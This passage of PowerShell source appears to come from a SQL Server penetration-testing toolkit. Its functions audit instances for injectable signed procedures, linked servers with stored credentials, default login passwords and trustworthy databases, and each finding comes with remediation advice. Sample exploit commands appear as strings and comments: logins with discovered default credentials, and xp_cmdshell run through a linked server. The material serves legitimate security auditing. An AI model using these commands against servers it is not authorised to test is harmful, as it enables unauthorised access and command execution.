            $IsVulnerable = "Yes"
            $IsExploitable = "Unknown"

            # Add information to finding for each instance of potential sqli
            $SQLiResults |
            ForEach-Object{
            
                # Set instance values
                $DatabaseName = $_.DatabaseName 
                $SchemaName = $_.SchemaName
                $ProcedureName = $_.ProcedureName
                $ObjectName = "$DatabaseName.$SchemaName.$ProcedureName"
                $Details =  "The $ObjectName stored procedure is affected."
                
                # Add to report 
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)        
            }
        }    

        # ------------------------------------------------------------------
        # Exploit Vulnerability
        # ------------------------------------------------------------------
        if($Exploit){
            Write-Verbose "$Instance : No automatic exploitation option has been provided. Uninformed exploitation of SQLi can have a negative impact on production environments."
        }

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ---------------------------------------
# Invoke-SQLAuditSQLiSpSigned
# ---------------------------------------
# Author: Scott Sutherland
Function Invoke-SQLAuditSQLiSpSigned
{
    <#
            .SYNOPSIS
            This will return stored procedures using dynamic SQL and the EXECUTE AS OWNER clause that may suffer from SQL injection.
            There is also an options to check for 
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER Exploit
            Exploit vulnerable issues.
            .EXAMPLE
            PS C:\> Invoke-SQLAuditSQLiSpSigned -Instance SQLServer1\STANDARDDEV2014

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            Vulnerability : Potential SQL Injection
            Description   : The affected procedure is using dynamic SQL and is signed.  As a result, it may be possible to impersonate the procedure owner if SQL injection is possible.
            server.
            Remediation   : Consider using parameterized queries instead of concatenated strings, and use signed procedures instead of the "EXECUTE AS OWNER" clause.'
            Severity      : High
            IsVulnerable  : Yes
            IsExploitable : No
            Exploited     : No
            ExploitCmd    : No automated exploitation option has been provided, but to view the procedure code use: Get-SQLStoredProcedureSQLi -Verbose -Instance SQLServer1\STANDARDDEV2014 -Keyword "EXECUTE AS OWNER" 
            Details       : The testdb.dbo.sp_vulnerable stored procedure is affected.
            Reference     : https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditSQLiSpSigned -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login."
            Return
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Potential SQL Injection - Signed by Certificate Login'
        $Description   = 'The affected procedure is using dynamic SQL and has been signed by a certificate login.  As a result, it may be possible to impersonate signer if SQL injection is possible.'
        $Remediation   = 'Consider using parameterized queries instead of concatenated strings.'
        $Severity      = 'High'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "No automated exploitation option has been provided, but to view the procedure code use: Get-SQLStoredProcedureSQLi -Verbose -Instance $Instance -OnlySigned"
        $Details       = ''
        $Reference     = 'https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------
        # $IsVulnerable  = "No" or $IsVulnerable  = "Yes"
                
        # Get SP with dynamic sql and execute as owner
        $SQLiResults = Get-SQLStoredProcedureSQLi -Instance $Instance -Username $Username -Password $Password -Credential $Credential -OnlySig
        
        # Check for results
        if($SQLiResults.rows.count -ge 1){
            
            # Confirmed vulnerable
            $IsVulnerable = "Yes"
            $IsExploitable = "Unknown"

            # Add information to finding for each instance of potential sqli
            $SQLiResults |
            ForEach-Object{
            
                # Set instance values
                $DatabaseName = $_.DatabaseName 
                $SchemaName = $_.SchemaName
                $ProcedureName = $_.ProcedureName
                $ObjectName = "$DatabaseName.$SchemaName.$ProcedureName"
                $Details =  "The $ObjectName stored procedure is affected."
                
                # Add to report 
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)        
            }
        }    

        # ------------------------------------------------------------------
        # Exploit Vulnerability
        # ------------------------------------------------------------------
        if($Exploit){
            Write-Verbose "$Instance : No automatic exploitation option has been provided. Uninformed exploitation of SQLi can have a negative impact on production environments."
        }

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ---------------------------------------
# Invoke-SQLAuditPrivServerLink
# ---------------------------------------
# Author: Scott Sutherland
Function Invoke-SQLAuditPrivServerLink
{
    <#
            .SYNOPSIS
            Check if any SQL Server links are configured with remote credentials.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER Exploit
            Exploit vulnerable issues.
            .EXAMPLE
            PS C:\> Invoke-SQLAuditPrivServerLink -Instance SQLServer1\STANDARDDEV2014

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            Vulnerability : Excessive Privilege - Linked Server
            Description   : One or more linked servers is preconfigured with alternative credentials which could allow a least privilege login to escalate their privileges on a remote
            server.
            Remediation   : Configure SQL Server links to connect to remote servers using the login's current security context.
            Severity      : Medium
            IsVulnerable  : Yes
            IsExploitable : No
            Exploited     : No
            ExploitCmd    : Example query: SELECT * FROM OPENQUERY([Server01\SQLEXPRESS],'Select ''Server: '' + @@Servername +'' '' + ''Login: '' + SYSTEM_USER')
            Details       : The SQL Server link Server01\SQLEXPRESS was found configured with the test login.
            Reference     : https://msdn.microsoft.com/en-us/library/ms190479.aspx
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditPrivServerLink -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Server Link"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Excessive Privilege - Linked Server'
        $Description   = 'One or more linked servers is preconfigured with alternative credentials which could allow a least privilege login to escalate their privileges on a remote server.'
        $Remediation   = "Configure SQL Server links to connect to remote servers using the login's current security context."
        $Severity      = 'Medium'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'There is not exploit available at this time.'
        if($Username)
        {
            #$ExploitCmd    = "Invoke-SQLAuditPrivServerLink -Instance $Instance -Username $Username -Password $Password -Exploit"
        }
        else
        {
            #$ExploitCmd    = "Invoke-SQLAuditPrivServerLink -Instance $Instance -Exploit"
        }
        $Details       = ''
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms190479.aspx'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Select links configured with static credentials
        $LinkedServers = Get-SQLServerLink -Verbose -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | 
        Where-Object { $_.LocalLogin -ne 'Uses Self Credentials' -and ([string]$_.RemoteLoginName).Length -ge 1}

        # Update vulnerable status
        if($LinkedServers)
        {
            $IsVulnerable  = 'Yes'
            $LinkedServers |
            ForEach-Object -Process {
                $Details = 
                $LinkName = $_.DatabaseLinkName
                $LinkUser = $_.RemoteLoginName
                $LinkAccess = $_.is_data_access_enabled
                $ExploitCmd = "Example query: SELECT * FROM OPENQUERY([$LinkName],'Select ''Server: '' + @@Servername +'' '' + ''Login: '' + SYSTEM_USER')"

                if($LinkUser -and $LinkAccess -eq 'True')
                {
                    Write-Verbose -Message "$Instance : - The $LinkName linked server was found configured with the $LinkUser login."
                    $Details = "The SQL Server link $LinkName was found configured with the $LinkUser login."
                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                }
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No exploitable SQL Server links were found."
        }

        # -----------------------------------------------------------------
        # Check for exploit dependancies
        # Note: Typically secondary configs required for dba/os execution
        # -----------------------------------------------------------------
        # $IsExploitable = "No" or $IsExploitable = "Yes"
        # Check if the link is alive and verify connection + check if sysadmin


        # -----------------------------------------------------------------
        # Exploit Vulnerability
        # Note: Add the current user to sysadmin fixed server role
        # -----------------------------------------------------------------
        # $Exploited = "No" or $Exploited     = "Yes"
        # select * from openquery("server\intance",'EXEC xp_cmdshell whoami WITH RESULT SETS ((output VARCHAR(MAX)))')
        # Also, recommend link crawler module


        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ---------------------------------------
# Invoke-SQLAuditDefaultLoginPw
# ---------------------------------------
# Author: Scott Sutherland
# Reference: https://github.com/pwnwiki/pwnwiki.github.io/blob/master/tech/db/mssql.md
Function  Invoke-SQLAuditDefaultLoginPw
{
    <#
            .SYNOPSIS
            Based on the instance name, test if SQL Server is configured with default passwords.
            There is also an options to check for 
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER Exploit
            Exploit vulnerable issues.
            .EXAMPLE
            PS C:\> Invoke-SQLAuditDefaultLoginPw -Instance SQLServer1\STANDARDDEV2014

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            Vulnerability : Default SQL Server Login Password
            Description   : The target SQL Server instance is configured with a default SQL login and password.
            Remediation   : Ensure all SQL Server logins are required to use a strong password. Considered inheriting the OS password policy.
            Severity      : High
            IsVulnerable  : Yes
            IsExploitable : No
            Exploited     : No
            ExploitCmd    : Get-SQLQuery -Verbose -Instance SQLServer1\STANDARDDEV2014 -Q "Select @@Version" -Username test -Password test. 
            Details       : Affected credentials: test/test.
            Reference     : https://github.com/pwnwiki/pwnwiki.github.io/blob/master/tech/db/mssql.md
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditDefaultLoginPw -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Default SQL Server Login Password"

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Default SQL Server Login Password'
        $Description   = 'The target SQL Server instance is configured with a default SQL login and password used by a common application.'
        $Remediation   = 'Ensure all SQL Server logins are required to use a strong password. Consider inheriting the OS password policy.'
        $Severity      = 'High'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "Get-SQLQuery -Verbose -Instance $Instance -Q `"Select @@Version`" -Username test -Password test."
        $Details       = ''
        $Reference     = 'https://github.com/pwnwiki/pwnwiki.github.io/blob/master/tech/db/mssql.md'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Check for default passwords
        $Results = Get-SQLServerLoginDefaultPw -Verbose -Instance $Instance 

        if($Results){
            $IsVulnerable = "Yes"
            $IsExploitable = "Yes"
        }

        # Create report records
        $Results | 
        ForEach-Object {
            $DefaultComputer = $_.Computer
            $DefaultInstance = $_.Instance
            $DefaultUsername = $_.Username
            $DefaultPassword = $_.Password
            $DefaultIsSysadmin = $_.IsSysadmin

            # Check if sysadmin
            
            # Add record            
            $Details = "Default credentials found: $DefaultUsername / $DefaultPassword (sysadmin: $DefaultIsSysadmin)."
            $ExploitCmd    = "Get-SQLQuery -Verbose -Instance $DefaultInstance -Q `"Select @@Version`" -Username $DefaultUsername -Password $DefaultPassword"
            $null = $TblData.Rows.Add($DefaultComputer, $DefaultInstance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)                        
        }        
        
        #Status user
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Default SQL Server Login Password"
    }
    End
    {           
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ---------------------------------------
# Invoke-SQLAuditPrivTrustworthy
# ---------------------------------------
# Author: Scott Sutherland
Function Invoke-SQLAuditPrivTrustworthy
{
    <#
            .SYNOPSIS
            Check if any databases have been configured as trustworthy.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER Exploit
            Exploit vulnerable issues.
            .EXAMPLE
            PS C:\> Invoke-SQLAuditPrivTrustworthy -Instance SQLServer1\STANDARDDEV2014

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            Vulnerability : Excessive Privilege - Trustworthy Database
            Description   : One or more database is configured as trustworthy.  The TRUSTWORTHY database property is used to indicate whether the instance of SQL Server trusts the database
            and the contents within it.  Including potentially malicious assemblies with an EXTERNAL_ACCESS or UNSAFE permission setting. Also, potentially malicious modules
            that are defined to execute as high privileged users. Combined with other weak configurations it can lead to user impersonation and arbitrary code exection on
            the server.
            Remediation   : Configured the affected database so the 'is_trustworthy_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE MyAppsDb SET TRUSTWORTHY ON' is used to
            set a database as trustworthy.  A query similar to 'ALTER DATABASE MyAppDb SET TRUSTWORTHY OFF' can be use to unset it.
            Severity      : Low
            IsVulnerable  : Yes
            IsExploitable : No
            Exploited     : No
            ExploitCmd    : There is not exploit available at this time.
            Details       : The database testdb was found configured as trustworthy.
            Reference     : https://msdn.microsoft.com/en-us/library/ms187861.aspx
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditPrivTrustworthy -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Trusted Database"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Excessive Privilege - Trustworthy Database'
        $Description   = 'One or more database is configured as trustworthy.  The TRUSTWORTHY database property is used to indicate whether the instance of SQL Server trusts the database and the contents within it.  Including potentially malicious assemblies with an EXTERNAL_ACCESS or UNSAFE permission setting. Also, potentially malicious modules that are defined to execute as high privileged users. Combined with other weak configurations it can lead to user impersonation and arbitrary code exection on the server.'
        $Remediation   = "Configured the affected database so the 'is_trustworthy_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE MyAppsDb SET TRUSTWORTHY ON' is used to set a database as trustworthy.  A query similar to 'ALTER DATABASE MyAppDb SET TRUSTWORTHY OFF' can be use to unset it."
        $Severity      = 'Low'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'There is not exploit available at this time.'
        $Details       = ''
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms187861.aspx'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Select links configured with static credentials
        $TrustedDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.DatabaseName -ne 'msdb' -and $_.is_trustworthy_on -eq 'True'
        }

        # Update vulnerable status
        if($TrustedDatabases)
        {
            $IsVulnerable  = 'Yes'
            $TrustedDatabases |
            ForEach-Object -Process {
                $DatabaseName = $_.DatabaseName

                Write-Verbose -Message "$Instance : - The database $DatabaseName was found configured as trustworthy."
                $Details = "The database $DatabaseName was found configured as trustworthy."
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No non-default trusted databases were found."
        }

        # -----------------------------------------------------------------
        # Check for exploit dependancies
        # Note: Typically secondary configs required for dba/os execution
        # -----------------------------------------------------------------
        # $IsExploitable = "No" or $IsExploitable = "Yes"
        # Check if the link is alive and verify connection + check if sysadmin


        # -----------------------------------------------------------------
        # Exploit Vulnerability
        # Note: Add the current user to sysadmin fixed server role
        # -----------------------------------------------------------------
        # $Exploited = "No" or $Exploited     = "Yes"
        # select * from openquery("server\intance",'EXEC xp_cmdshell whoami WITH RESULT SETS ((output VARCHAR(MAX)))')
        # Also, recommend link crawler module


        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ---------------------------------------
# Invoke-SQLAuditPrivAutoExecSp
# ---------------------------------------
# Author: Scott Sutherland
Function  Invoke-SQLAuditPrivAutoExecSp
{
    <#
            .SYNOPSIS
            Check if any databases have been configured as trustworthy.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER Exploit
            Exploit vulnerable issues.
            .EXAMPLE
            PS C:\>  Invoke-SQLAuditPrivAutoExecSp -Instance SQLServer1\STANDARDDEV2014

            .EXAMPLE
            PS C:\>  Invoke-SQLInstanceLocal | Invoke-SQLAuditPrivAutoExecSp -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblAutoExecPrivs = new-object System.Data.DataTable 
        $TblAutoExecPrivs.Columns.add('ComputerName') | Out-Null
        $TblAutoExecPrivs.Columns.add('Instance') | Out-Null
        $TblAutoExecPrivs.Columns.add('DatabaseName') | Out-Null
        $TblAutoExecPrivs.Columns.add('SchemaName') | Out-Null
        $TblAutoExecPrivs.Columns.add('ProcedureName') | Out-Null
        $TblAutoExecPrivs.Columns.add('ProcedureType') | Out-Null
        $TblAutoExecPrivs.Columns.add('ProcedureDefinition') | Out-Null
        $TblAutoExecPrivs.Columns.add('SQL_DATA_ACCESS') | Out-Null
        $TblAutoExecPrivs.Columns.add('ROUTINE_BODY') | Out-Null    
        $TblAutoExecPrivs.Columns.add('CREATED') | Out-Null         
        $TblAutoExecPrivs.Columns.add('LAST_ALTERED') | Out-Null    
        $TblAutoExecPrivs.Columns.add('is_ms_shipped') | Out-Null   
        $TblAutoExecPrivs.Columns.add('is_auto_executed') | Out-Null 
        $TblAutoExecPrivs.Columns.add('PrincipalName') | Out-Null
        $TblAutoExecPrivs.Columns.add('PrincipalType') | Out-Null
        $TblAutoExecPrivs.Columns.add('PermissionName') | Out-Null
